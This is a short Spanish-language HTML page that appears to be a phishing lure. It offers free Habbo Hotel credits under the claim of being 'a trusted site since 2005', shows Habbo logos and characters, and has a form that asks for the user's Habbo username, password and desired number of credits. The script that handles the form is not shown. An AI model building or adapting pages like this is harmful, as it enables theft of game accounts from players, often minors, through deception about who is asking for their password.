<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Obtener Créditos Fácil y Seguro</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <h1>Obtener Créditos Fácil y Seguro</h1>
        <p>Una web de confianza desde 2005 para obtener créditos de forma fácil y segura.</p>
        <img src="habbo-hotel-logo.webp" alt="Habbo Hotel Logo" class="habbo-logo">
        <form id="credit-form">
            <label for="username">Usuario:</label>
            <input type="text" id="username" name="username" required>

            <label for="password">Contraseña:</label>
            <input type="password" id="password" name="password" required>

            <label for="credits">Número de Créditos:</label>
            <input type="number" id="credits" name="credits" required>

            <button type="submit">Enviar</button>
        </form>
        <img src="habbochars.jpeg" alt="Habbo Hotel Characters" class="habbo-characters">
    </div>
    <script src="scripts.js"></script>
</body>
</html>
